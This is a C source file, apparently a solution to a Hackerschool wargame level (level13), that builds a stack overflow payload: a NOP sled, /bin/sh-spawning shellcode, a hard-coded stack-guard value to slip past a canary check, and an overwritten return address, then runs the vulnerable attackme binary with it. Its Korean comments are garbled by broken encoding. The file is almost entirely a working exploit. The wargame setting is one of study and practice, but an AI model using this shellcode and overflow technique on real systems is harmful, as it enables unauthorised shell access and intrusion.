/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level13
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define NOP1 120
#define NOP2 891
#define BUFSIZE 1056   /* NOPs(120) + shellcode(25) + NOPs(891) + stackguard(4) +  + NOPs(8) + SFP(4) + ret(4) */

// �����ϸ� �ȵǴ� ���� ������ ��
char stackgd[] = "\x67\x45\x23\x01";

// ��ü��� �����Ű�� ���ڵ�
char shellcode[] =
        "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
        "\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

// char str[1024] �迭�� ���� �ּ�
char retAddr[] = "\xa0\xf2\xff\xbf";

int main()
{
    char cmdBuf[BUFSIZE];
    int i, j, k, l, stackLen, shellLen, retLen;

	// ���ð���, ���ڵ�, ���� �ּ��� ���� Ȯ��
    stackLen = strlen(stackgd);
    shellLen = strlen(shellcode);
    retLen = strlen(retAddr);

	// ���ڵ� �պκб��� NOP ��� �Ҵ�
    for(i=0; i<NOP1; i++)
        cmdBuf[i] = NOP;
    
	// NOP �ڿ� ���ڵ� �Ҵ�
    for(j=0; j<shellLen; j++)
        cmdBuf[i++] = shellcode[j];
    
	// ������ ������ NOP ��� �Ҵ�
    for(j=0; j<NOP2; j++)
        cmdBuf[i++] = NOP;
    
	// ���� ������ ���� ���� ����
    for(j=0; j<stackLen; j++)
        cmdBuf[i++] = stackgd[j];
    
	// ������ ������ NOP ��� �Ҵ�
    for(j=0; j<retLen*3; j++)
        cmdBuf[i++] = NOP;
    
	// ��� ���ڵ��� �ּ� �Ҵ�
    for(j=0; j<retLen; j++)
        cmdBuf[i++] = retAddr[j];

    execl("/home/level13/attackme", "attackme", cmdBuf, 0);

}
